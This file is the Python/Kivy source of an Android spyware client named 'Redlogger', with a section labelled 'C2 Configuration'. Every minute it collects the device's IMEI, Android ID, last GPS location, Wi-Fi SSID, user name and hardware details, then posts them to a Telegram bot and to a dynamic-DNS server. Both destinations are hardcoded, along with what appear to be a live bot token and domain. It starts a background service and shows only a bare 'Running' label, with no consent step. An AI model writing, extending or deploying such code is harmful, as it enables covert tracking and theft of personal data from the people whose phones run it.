from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
import requests
import os
import platform
import getpass

from jnius import autoclass, cast

# C2 Configuration
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "Y7588831662:AAGsQmG624Dhl6q5opTQS4fGU_SGXE8EcoU")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "7070240983")
NOIP_URL = os.environ.get("NOIP_URL", "https://marwangpt237.ddns.net") # e.g., http://your-domain.ddns.net

# Android specific imports
if platform.system() == 'android':
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    Context = autoclass('android.content.Context')
    Settings = autoclass('android.provider.Settings$Secure')
    BatteryManager = autoclass('android.os.BatteryManager')
    Intent = autoclass('android.content.Intent')
    IntentFilter = autoclass('android.content.IntentFilter')
    Build = autoclass('android.os.Build')
    StatFs = autoclass('android.os.StatFs')
    Locale = autoclass('java.util.Locale')
    ConnectivityManager = autoclass('android.net.ConnectivityManager')
    NetworkInfo = autoclass('android.net.NetworkInfo')
    WifiManager = autoclass('android.net.wifi.WifiManager')
    TelephonyManager = autoclass('android.telephony.TelephonyManager')
    LocationManager = autoclass('android.location.LocationManager')
    LocationListener = autoclass('android.location.LocationListener')
    Bundle = autoclass('android.os.Bundle')

    # Start the service
    service = autoclass('org.redlogger.redlogger.ServiceRedloggerService')
    service.start(PythonActivity.mActivity, '')

class RedloggerClient(BoxLayout):
    def __init__(self, **kwargs):
        super(RedloggerClient, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.label = Label(text='Redlogger Client Running...')
        self.add_widget(self.label)
        Clock.schedule_interval(self.send_data, 60)  # Send data every 60 seconds

    def send_data(self, dt):
        data = self.collect_data()
        self.send_to_telegram(data)
        self.send_to_noip(data)

    def collect_data(self):
        data = {
            'imei': self.get_imei(),
            'android_version': platform.release(),
            'battery': self.get_battery_status(),
            'location': self.get_location(),
            'user': getpass.getuser(),
            'device': platform.node(),
            'device_id': self.get_android_id(),
            'manufacturer': self.get_manufacturer(),
            'model': self.get_model(),
            'total_ram': self.get_total_ram(),
            'available_ram': self.get_available_ram(),
            'total_storage': self.get_total_storage(),
            'available_storage': self.get_available_storage(),
            'network_type': self.get_network_type(),
            'wifi_ssid': self.get_wifi_ssid(),
            'locale': self.get_locale(),
        }
        return data

    def get_android_id(self):
        if platform.system() == 'android':
            return Settings.getString(PythonActivity.mActivity.getContentResolver(), Settings.ANDROID_ID)
        return 'N/A'

    def get_imei(self):
        if platform.system() == 'android':
            try:
                telephony_manager = cast(TelephonyManager, PythonActivity.mActivity.getSystemService(Context.TELEPHONY_SERVICE))
                # For API 26+, getImei() requires READ_PRIVILEGED_PHONE_STATE or READ_PHONE_STATE
                # which might not be granted. Using getDeviceId() for broader compatibility.
                return telephony_manager.getDeviceId()
            except Exception as e:
                print(f"Error getting IMEI: {e}")
        return 'N/A'

    def get_battery_status(self):
        if platform.system() == 'android':
            try:
                battery_intent = PythonActivity.mActivity.registerReceiver(None, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                level = battery_intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                scale = battery_intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                if level == -1 or scale == -1:
                    return 'N/A'
                return f"{round(level * 100 / scale)}%"
            except Exception as e:
                print(f"Error getting battery status: {e}")
        return 'N/A'

    def get_location(self):
        if platform.system() == 'android':
            try:
                location_manager = cast(LocationManager, PythonActivity.mActivity.getSystemService(Context.LOCATION_SERVICE))
                # Request location updates (requires ACCESS_FINE_LOCATION or ACCESS_COARSE_LOCATION)
                # This is a simplified approach. A real implementation would need a proper LocationListener.
                # For now, we'll try to get the last known location.
                last_location = location_manager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if last_location:
                    return f"Lat: {last_location.getLatitude()}, Lon: {last_location.getLongitude()}"
            except Exception as e:
                print(f"Error getting location: {e}")
        return 'N/A'

    def get_manufacturer(self):
        if platform.system() == 'android':
            return Build.MANUFACTURER
        return 'N/A'

    def get_model(self):
        if platform.system() == 'android':
            return Build.MODEL
        return 'N/A'

    def get_total_ram(self):
        if platform.system() == 'android':
            try:
                activity_manager = autoclass('android.app.ActivityManager')
                memory_info = activity_manager.MemoryInfo()
                activity_manager.getMemoryInfo(memory_info)
                return f"{round(memory_info.totalMem / (1024*1024*1024), 2)} GB"
            except Exception as e:
                print(f"Error getting total RAM: {e}")
        return 'N/A'

    def get_available_ram(self):
        if platform.system() == 'android':
            try:
                activity_manager = autoclass('android.app.ActivityManager')
                memory_info = activity_manager.MemoryInfo()
                activity_manager.getMemoryInfo(memory_info)
                return f"{round(memory_info.availMem / (1024*1024*1024), 2)} GB"
            except Exception as e:
                print(f"Error getting available RAM: {e}")
        return 'N/A'

    def get_total_storage(self):
        if platform.system() == 'android':
            try:
                stat = StatFs(Environment.getExternalStorageDirectory().getPath())
                total_blocks = stat.getBlockCountLong()
                block_size = stat.getBlockSizeLong()
                return f"{round((total_blocks * block_size) / (1024*1024*1024), 2)} GB"
            except Exception as e:
                print(f"Error getting total storage: {e}")
        return 'N/A'

    def get_available_storage(self):
        if platform.system() == 'android':
            try:
                stat = StatFs(Environment.getExternalStorageDirectory().getPath())
                available_blocks = stat.getAvailableBlocksLong()
                block_size = stat.getBlockSizeLong()
                return f"{round((available_blocks * block_size) / (1024*1024*1024), 2)} GB"
            except Exception as e:
                print(f"Error getting available storage: {e}")
        return 'N/A'

    def get_network_type(self):
        if platform.system() == 'android':
            try:
                connectivity_manager = cast(ConnectivityManager, PythonActivity.mActivity.getSystemService(Context.CONNECTIVITY_SERVICE))
                active_network = connectivity_manager.getActiveNetworkInfo()
                if active_network and active_network.isConnected():
                    if active_network.getType() == ConnectivityManager.TYPE_WIFI:
                        return 'Wi-Fi'
                    elif active_network.getType() == ConnectivityManager.TYPE_MOBILE:
                        return 'Mobile Data'
                return 'No Network'
            except Exception as e:
                print(f"Error getting network type: {e}")
        return 'N/A'

    def get_wifi_ssid(self):
        if platform.system() == 'android':
            try:
                wifi_manager = cast(WifiManager, PythonActivity.mActivity.getApplicationContext().getSystemService(Context.WIFI_SERVICE))
                wifi_info = wifi_manager.getConnectionInfo()
                if wifi_info:
                    ssid = wifi_info.getSSID()
                    if ssid and ssid != '<unknown ssid>':
                        return ssid.strip('"')
                return 'N/A'
            except Exception as e:
                print(f"Error getting WiFi SSID: {e}")
        return 'N/A'

    def get_locale(self):
        if platform.system() == 'android':
            return Locale.getDefault().toString()
        return 'N/A'

    def send_to_telegram(self, data):
        if TELEGRAM_BOT_TOKEN != 'YOUR_TELEGRAM_BOT_TOKEN':
            message = """
            **Redlogger Data**
            Device ID: {device_id}
            IMEI: {imei}
            Android Version: {android_version}
            Manufacturer: {manufacturer}
            Model: {model}
            Battery: {battery}
            Location: {location}
            Total RAM: {total_ram}
            Available RAM: {available_ram}
            Total Storage: {total_storage}
            Available Storage: {available_storage}
            Network Type: {network_type}
            WiFi SSID: {wifi_ssid}
            Locale: {locale}
            User: {user}
            Device: {device}
            """.format(**data)
            url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
            payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
            try:
                requests.post(url, json=payload)
            except Exception as e:
                print(f'Error sending to Telegram: {e}')

    def send_to_noip(self, data):
        if NOIP_URL != 'YOUR_NOIP_URL':
            try:
                requests.post(NOIP_URL, json=data)
            except Exception as e:
                print(f'Error sending to No-IP: {e}')

class RedloggerApp(App):
    def build(self):
        return RedloggerClient()

if __name__ == '__main__':
    RedloggerApp().run()


